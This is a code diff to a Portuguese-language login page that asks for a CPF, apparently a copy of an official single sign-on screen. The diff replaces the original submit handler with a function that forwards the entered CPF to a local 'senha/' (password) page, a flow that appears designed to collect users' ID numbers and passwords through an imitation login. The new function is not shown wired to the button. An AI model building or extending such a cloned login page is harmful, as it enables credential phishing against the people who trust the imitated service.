@@ -53,8 +53,22 @@
 					<div class="button-panel" id="login-button-panel">
 						<button id="enter-account-id" type="submit" name="operation" value="enter-account-id" class="button-continuar" tabindex="2">Continuar</button>
             			<script>
-	  							document.getElementById("enter-account-id").addEventListener("click", event=>onSubmit(event));
-	  						</script>
+					function redirectToSenha() {
+					        // Get the CPF input value
+					        const cpfInput = document.getElementById("accountId");
+					        const cpf = cpfInput.value;
+					
+					        // Validate CPF input (optional - add logic as needed)
+					        if (!cpf || cpf.trim() === "") {
+					            alert("Por favor, digite seu CPF.");
+					            return;
+					        }
+					
+					        // Redirect to the "senha/" page with the CPF as a query parameter
+					        const baseUrl = "senha/";
+					        const redirectUrl = `${baseUrl}?cpf=${encodeURIComponent(cpf)}`;
+					        window.location.href = redirectUrl;
+					    }	  						</script>
             			</div>
 				</div>
 				<label id="title-outras-op">Outras opções de identificação:</label>
